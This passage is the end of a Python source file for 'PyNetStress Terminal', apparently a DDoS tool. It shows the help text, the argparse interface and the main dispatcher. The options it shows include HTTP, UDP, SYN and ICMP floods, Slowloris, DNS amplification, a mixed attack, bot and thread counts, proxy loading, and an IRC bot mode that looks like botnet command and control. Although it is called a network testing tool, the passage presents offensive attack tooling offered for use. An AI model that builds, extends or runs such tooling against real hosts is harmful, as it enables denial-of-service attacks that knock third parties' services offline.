  recon <command>       Reconnaissance commands
    ping <target>       Ping a target
    traceroute <target> Traceroute to a target
    portscan <target>   Scan common ports on target
    whois <target>      WHOIS lookup for target
    dns <target>        DNS enumeration for target
    subdomain <target>  Subdomain scan for target

  ddos <mode>           Start DDoS system
    local [host]        Local server mode (host or client)
    irc <server>        IRC bot mode

  status                Check target status
  stop                  Stop current attack

{Fore.YELLOW}ATTACK METHODS:{Style.RESET_ALL}
  HTTP Flood        - Flood target with HTTP requests
  UDP Flood         - Flood target with UDP packets (requires root)
  SYN Flood         - SYN flood attack (requires root)
  ICMP Flood        - ICMP ping flood (requires root)
  Slowloris         - Slow HTTP attack keeping connections open
  DNS Amplification - DNS amplification attack (requires root)
  Mixed Attack      - Combined attack using all methods

{Fore.YELLOW}EXAMPLES:{Style.RESET_ALL}
  python pynetstress.py attack example.com -m "HTTP Flood" -b 100 -t 50
  python pynetstress.py recon ping example.com
  python pynetstress.py ddos local
  python pynetstress.py ddos irc irc.example.com:6667:#channel:botname
  python pynetstress.py --debug attack example.com -m "Mixed Attack"
{Style.RESET_ALL}"""
    print(help_text)

def main():
    global DEBUG_MODE
    
    parser = argparse.ArgumentParser(description="PyNetStress Terminal - Advanced Network Testing Tool", add_help=False)
    parser.add_argument('-h', '--help', action='store_true', help='Show help message')
    parser.add_argument('-v', '--version', action='store_true', help='Show version information')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    attack_parser = subparsers.add_parser('attack', help='Start attack on target')
    attack_parser.add_argument('target', help='Target URL or IP address')
    attack_parser.add_argument('-m', '--method', default='HTTP Flood', 
                              choices=['HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 'Slowloris', 'DNS Amplification', 'Mixed Attack'],
                              help='Attack method')
    attack_parser.add_argument('-b', '--bots', type=int, default=100, help='Number of bots')
    attack_parser.add_argument('-t', '--threads', type=int, default=50, help='Threads per bot')
    attack_parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    attack_parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds')
    attack_parser.add_argument('--proxy-file', help='Load proxies from file')
    
    recon_parser = subparsers.add_parser('recon', help='Reconnaissance commands')
    recon_parser.add_argument('recon_command', choices=['ping', 'traceroute', 'portscan', 'whois', 'dns', 'subdomain'],
                             help='Reconnaissance command')
    recon_parser.add_argument('recon_target', help='Target for reconnaissance')
    
    ddos_parser = subparsers.add_parser('ddos', help='Start DDoS system')
    ddos_parser.add_argument('mode', choices=['local', 'irc'], help='DDoS mode')
    ddos_parser.add_argument('target', nargs='?', help='Target server for DDoS system')
    
    subparsers.add_parser('status', help='Check target status')
    subparsers.add_parser('stop', help='Stop current attack')
    
    args, unknown = parser.parse_known_args()
    
    if args.help or not hasattr(args, 'command'):
        show_help()
        return
    
    if args.version:
        print(f"PyNetStress Terminal v{VERSION}")
        return
    
    DEBUG_MODE = args.debug
    
    tool = PyNetStressTerminal()
    tool.print_banner()
    
    try:
        if args.command == 'attack':
            tool.target_url = args.target
            tool.method = args.method
            tool.bot_count = args.bots
            tool.thread_count = args.threads
            tool.target_port = args.port
            tool.duration = args.duration
            
            if args.proxy_file:
                tool.use_proxies = tool.load_proxies(args.proxy_file)
            
            tool.start_attack()
        
        elif args.command == 'recon':
            if args.recon_command == 'ping':
                tool.ping(args.recon_target)
            elif args.recon_command == 'traceroute':
                tool.traceroute(args.recon_target)
            elif args.recon_command == 'portscan':
                tool.port_scan(args.recon_target)
            elif args.recon_command == 'whois':
                tool.whois_lookup(args.recon_target)
            elif args.recon_command == 'dns':
                tool.dns_enum(args.recon_target)
            elif args.recon_command == 'subdomain':
                tool.subdomain_scan(args.recon_target)
        
        elif args.command == 'ddos':
            tool.start_ddos_system(args.mode, args.target)
            
            if args.mode == 'local' and not args.target:
                tool.print_status("Local server running. Press Ctrl+C to stop.", "info")
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    tool.print_status("Stopping local server", "info")
                    tool.local_server_running = False
                    if tool.local_server:
                        tool.local_server.close()
        
        elif args.command == 'status':
            if tool.resolve_target(tool.target_url if tool.target_url else "example.com"):
                status = tool.check_target_status()
                tool.print_target_status(status)
        
        elif args.command == 'stop':
            tool.running = False
            tool.print_status("Attack stopped", "success")
    
    except KeyboardInterrupt:
        tool.print_status("Operation cancelled by user", "warning")
    except Exception as e:
        tool.print_status(f"Error: {e}", "error")
        if DEBUG_MODE:
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    main()